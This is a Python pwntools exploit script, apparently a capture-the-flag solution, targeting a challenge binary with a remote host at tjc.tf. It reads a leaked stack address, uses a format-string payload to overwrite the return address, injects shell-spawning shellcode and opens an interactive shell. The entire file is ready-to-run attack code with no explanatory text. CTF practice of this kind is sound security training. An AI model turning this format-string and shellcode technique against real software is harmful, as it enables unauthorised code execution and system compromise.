#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.binary = exe
context.arch = "amd64"

shellcode = shellcraft.sh()
print(shellcode)
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r,"""
                        b * main +326
                        b * main + 952
                        c  
                    """)
    else:
        r = remote("tjc.tf", 31363)

    return r


def main():
    r = conn()
    leak = r.recvline().strip().split(b", ")
    log.info(f"Leaked address: {leak}")
    
    my_input_addr = int(leak[0], 16)
    ret_address = int(leak[0], 16) + 1048
    log.info(f"My input address: {hex(my_input_addr)}")
    log.info(f"Return address: {hex(ret_address)}")

    r.recvuntil(b"exit) ")
    r.sendline("deposit")

    frmtstring = fmtstr_payload(12, {ret_address: my_input_addr+8})
    r.sendline(frmtstring)
    log.info(f"Overwritten the return address with our address +8 : {hex(my_input_addr)}")


    r.recvuntil(b"exit) ")
    r.sendline("deposit")
    payload = flat(
        "A" * 8,
        asm(shellcode)
    )
    r.sendline(payload)
    log.info("Sent shellcode to the program")

    
    r.recvuntil(b"exit) ")
    r.sendline("exit")


    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
